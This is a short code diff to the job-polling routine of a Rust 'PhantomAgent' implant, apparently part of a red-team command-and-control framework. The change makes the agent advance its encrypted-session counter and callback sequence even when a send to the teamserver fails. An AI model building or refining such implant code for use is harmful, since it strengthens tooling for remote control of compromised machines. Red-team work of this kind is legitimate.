@@ -42,13 +42,15 @@ impl PhantomAgent {
             &[],
         )?;
 
-        // Advance CTR and seq only after the POST succeeds. If transport fails (listener
-        // down during reconnect), the teamserver never parsed this body — skipping the
-        // advance preserves shared CTR alignment (red-cell-c2-ya2cm).
-        let response = self.transport.send(&packet).await?;
+        let response = self.transport.send(&packet).await;
 
+        // Always advance — the teamserver consumes the packet and advances its CTR
+        // before sending the response. If the TCP response is lost, the server's
+        // CTR is ahead; not advancing here would desync every subsequent packet.
         self.ctr_offset += callback_ctr_blocks(u32::from(DemonCommand::CommandGetJob), 0);
         self.callback_seq += 1;
+
+        let response = response?;
 
         let (packages, next_offset) =
             parse_job_response(&self.session_crypto, self.ctr_offset, &response)?;
